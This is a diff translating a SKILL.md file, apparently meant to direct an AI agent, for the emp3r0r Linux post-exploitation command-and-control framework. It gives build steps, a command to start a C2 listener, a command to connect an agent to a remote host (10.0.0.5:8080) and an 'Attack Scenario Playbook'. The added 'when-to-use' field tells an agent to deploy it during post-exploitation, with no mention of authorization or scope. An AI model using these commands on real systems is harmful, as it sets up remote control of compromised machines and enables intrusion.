@@ -2,37 +2,38 @@
 name: emp3r0r-c2
 description: "emp3r0r: Linux post-exploitation C2. Signals: C2, command and control, start server, agent connection, modules."
 zh-signals: "emp3r0r: Linux 后渗透 C2。信号:c2,命令控制,起服务端,agent 连接,模块。"
+when-to-use: "Use during Linux post-exploitation when you need a C2 server and agents for command and control and module execution. Requires a reachable listener address and a built emp3r0r binary."
 ---
 
 # emp3r0r
 
-- 攻击大类:C35 C2框架与远控
-- 上游仓库:https://github.com/jm33-m0/emp3r0r
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C35 C2 Frameworks and Remote Control
+- Upstream Repository: https://github.com/jm33-m0/emp3r0r
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/jm33-m0/emp3r0r && cd emp3r0r && ./build.sh
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `./emp3r0r -l 0.0.0.0:8080` | 起服务端 |
-| `./emp3r0r -connect 10.0.0.5:8080` | agent 连接 |
-| `-m` | 模块 |
+| `./emp3r0r -l 0.0.0.0:8080` | Start the server |
+| `./emp3r0r -connect 10.0.0.5:8080` | Agent connection |
+| `-m` | Modules |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### Linux 后渗透 C2
+### Linux post-exploitation C2
 
 ```bash
 ./emp3r0r -l 8080
-# 国产 C2,Linux 渗透利器
+# Domestic C2, a powerful Linux pentest framework
 ```
 
-## 注意事项
+## Notes
 
-jm33-m0 出品,Linux 渗透 C2 框架。
+Linux pentest C2 framework by jm33-m0.
